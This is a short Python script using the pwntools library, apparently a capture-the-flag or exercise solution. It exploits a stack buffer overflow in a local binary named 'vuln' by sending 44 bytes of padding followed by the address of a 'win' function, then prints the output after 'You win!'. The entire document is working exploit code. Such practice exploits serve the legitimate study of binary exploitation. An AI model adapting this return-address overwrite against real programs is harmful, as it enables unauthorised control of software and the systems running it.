#!/usr/bin/env python3

from pwn import *
elf = ELF('./vuln')

#pattern = cyclic(100)
p = process('./vuln')
payload = 44*b"a" + p32(elf.symbols['win'])
p.recvuntil(b'Input: ')
p.sendline(payload)
p.recvuntil(b'You win!')
print(p.recvline().decode())

#p.interactive()